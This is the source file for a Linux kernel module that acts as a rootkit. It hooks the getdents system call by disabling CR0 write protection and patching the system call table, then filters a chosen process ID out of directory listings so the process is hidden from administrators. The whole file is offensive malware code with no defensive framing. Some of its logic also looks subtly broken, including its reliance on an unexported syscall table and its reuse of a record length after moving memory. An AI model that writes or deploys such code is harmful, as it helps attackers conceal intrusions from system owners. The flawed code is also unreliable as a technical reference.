#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/dirent.h>

static int hide_pid = 0; // Default hidden PID

module_param(hide_pid, int, 0);
MODULE_PARM_DESC(hide_pid, "Process ID to hide");

// Pointer to original sys_getdents system call
asmlinkage long (*original_getdents)(unsigned int, struct linux_dirent *, unsigned int);

// Custom getdents to filter out specific PIDs
asmlinkage long hooked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
    long ret = original_getdents(fd, dirp, count);
    if (ret <= 0) return ret;

    struct linux_dirent *d;
    unsigned long offset = 0;
    long bpos;

    // Buffer to store the directory entries
    char *buffer = kzalloc(ret, GFP_KERNEL);
    if (!buffer) return ret;

    // Copy data from user space
    if (copy_from_user(buffer, dirp, ret)) {
        kfree(buffer);
        return ret;
    }

    // Iterate through directory entries
    for (bpos = 0; bpos < ret;) {
        d = (struct linux_dirent *)(buffer + bpos);
        if (simple_strtol(d->d_name, NULL, 10) == hide_pid) {
            // Skip this entry if it matches the hidden PID
            memmove(d, (char *)d + d->d_reclen, ret - (bpos + d->d_reclen));
            ret -= d->d_reclen;
            continue;
        }
        bpos += d->d_reclen;
    }

    // Copy modified buffer back to user space
    if (copy_to_user(dirp, buffer, ret)) {
        kfree(buffer);
        return -EFAULT;
    }

    kfree(buffer);
    return ret;
}

// Replace system call
static int __init init_hook(void) {
    // Hook sys_getdents with custom function (requires access to syscall table)
    original_getdents = (void *)sys_call_table[__NR_getdents];
    write_cr0(read_cr0() & (~0x10000));  // Disable write protection
    sys_call_table[__NR_getdents] = (unsigned long)hooked_getdents;
    write_cr0(read_cr0() | 0x10000);    // Re-enable write protection

    printk(KERN_INFO "getdents() hooked, hiding PID: %d\n", hide_pid);
    return 0;
}

// Restore original system call
static void __exit exit_hook(void) {
    write_cr0(read_cr0() & (~0x10000));
    sys_call_table[__NR_getdents] = (unsigned long)original_getdents;
    write_cr0(read_cr0() | 0x10000);

    printk(KERN_INFO "getdents() restored\n");
}

module_init(init_hook);
module_exit(exit_hook);
MODULE_LICENSE("GPL");
